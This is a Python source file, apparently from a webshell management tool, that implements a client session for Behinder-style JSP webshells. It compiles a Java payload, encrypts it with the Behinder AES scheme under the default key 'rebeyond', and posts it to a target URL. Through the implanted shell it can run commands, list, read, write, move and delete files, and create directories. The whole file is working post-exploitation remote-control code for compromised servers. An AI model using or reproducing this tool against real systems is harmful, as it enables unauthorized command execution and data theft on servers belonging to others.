from pathlib import Path
import base64
import re
import hashlib
import json
import logging
import string
import subprocess
import typing as t
import tempfile

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    DirectoryEntry,
    get_http_client,
)
from ..core.php_session_common import (
    php_webshell_action_options,
    php_webshell_communication_options,
)

logger = logging.getLogger("core.sessions.php_behinder")

PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"

# TODO: 把这些函数移动到utils里


def parse_permission(perm: str):
    """将rwxrwxrwx格式的文件权限解析为755格式的

    Args:
        perm (str): rwxrwxrwx格式的文件权限
    """
    # 难看代码大赏
    result = ""
    if not re.match("^[rwx-]{9}$", perm):
        raise ValueError("Wrong permission format: " + perm)
    nums = list(map({"r": 4, "w": 2, "x": 1, "-": 0}.__getitem__, perm))
    for i in range(0, 9, 3):
        result += str(sum(nums[i : i + 3]))
    return result


def java_repr(s):
    return (
        '"'
        + "".join(
            (
                c
                if c in string.ascii_letters or c in string.digits
                else hex(ord(c)).replace("0x", "\\x")
            )
            for c in s
        )
        + '"'
    )


def md5_encode(s):
    """将给定的字符串或字节序列转换成MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s: str | bytes):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def behinder_aes(payload: bytes, key: bytes) -> bytes:
    """将给定的payload按照冰蝎的格式进行AES加密"""
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(payload, AES.block_size))
    return base64.b64encode(encrypted_data)


@register_session
class JSPWebshellBehinderAES:
    session_type = "BEHINDER_JSP_AES"
    readable_name = "冰蝎JSP"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="timeout_refresh_client",
                    name="超时更换HTTP Session",
                    type="checkbox",
                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

    async def submit_code(self, action_code: str):
        code = PAYLOAD_PATH.read_text()
        code = re.sub(
            ".+ETHER_GHOST_REPLACE_HERE", f"Object data = {action_code};", code
        )
        data = None
        with tempfile.TemporaryDirectory(delete=False) as d:
            print(f"{d=}")
            payload_code_filepath = Path(d) / "Payload.java"
            payload_bin_filepath = Path(d) / "Payload.class"
            payload_code_filepath.write_text(code)
            p = subprocess.Popen(["javac", payload_code_filepath.as_posix()])
            return_code = p.wait()
            assert return_code == 0, f"javac exit with {return_code=}"
            assert payload_bin_filepath.exists(), "javac failed to build payload"
            data = behinder_aes(payload_bin_filepath.read_bytes(), self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            if response.status_code != 200:
                raise exceptions.TargetError(f"{response.status_code=}")
            try:
                data = response.json()
            except Exception as e:
                raise exceptions.TargetError(
                    "Response is not json: " + repr(response.text)[:30]
                ) from e
            if data["code"] != 0:
                if data["error_type"] == "java.io.IOException":
                    raise exceptions.FileError(data["msg"])
                raise exceptions.TargetError(
                    f"{data['code']=} {data['error_type']=} {data['msg']=}"
                )
            return data["data"]
        except httpx.TimeoutException as exc:
            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
            # 此时服务端会为这个session id等待这个长时间操作
            # 所以我们再使用这个session id发起请求就会卡住
            # 所以我们要丢掉这个session id，使用另一个client发出请求
            if self.timeout_refresh_client:
                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc

    async def execute_cmd(self, cmd: str) -> str:
        return "\n".join(await self.submit_code(f"runCommand({json.dumps(cmd)})"))

    async def test_usablility(self) -> bool:
        return (await self.submit_code("ping()"))["name"] == "EtherGhost JSP"

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        entries = await self.submit_code(f"listFiles({json.dumps(dir_path)})")
        try:
            result = [
                DirectoryEntry(
                    name=str(entry["name"]),
                    permission=parse_permission(entry["permission"]),
                    filesize=int(entry["filesize"]),
                    entry_type=entry["entry_type"],
                )
                for entry in entries
                if entry["entry_type"]
                in ["dir", "file", "link-dir", "link-file", "unknown"]
            ]
            return result
        except Exception as exc:
            raise exceptions.TargetRuntimeError(f"解码结果失败: {exc}") from exc

    async def mkdir(self, dir_path: str) -> None:
        await self.submit_code(f"mkdir({json.dumps(dir_path)})")

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
        content_b64 = await self.submit_code(
            f"getFileContentsBase64({json.dumps(filepath)}, {max_size})"
        )
        try:
            return base64.b64decode(content_b64)
        except Exception as exc:
            raise exceptions.TargetRuntimeError("base64解码失败") from exc

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        """保存文件的内容，内容是一个字节序列，不是已经解码的字符串"""
        await self.submit_code(
            f"putFileContents({json.dumps(filepath)}, "
            f"base64Decode({json.dumps(base64_encode(content))}))"
        )
        return True

    async def delete_file(self, filepath: str) -> bool:
        return await self.submit_code(f"deleteFile({json.dumps(filepath)})")

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        await self.submit_code(
            f"moveFile({json.dumps(filepath)}, {json.dumps(new_filepath)})"
        )

    async def get_pwd(self) -> str:
        return await self.submit_code("getPwd()")
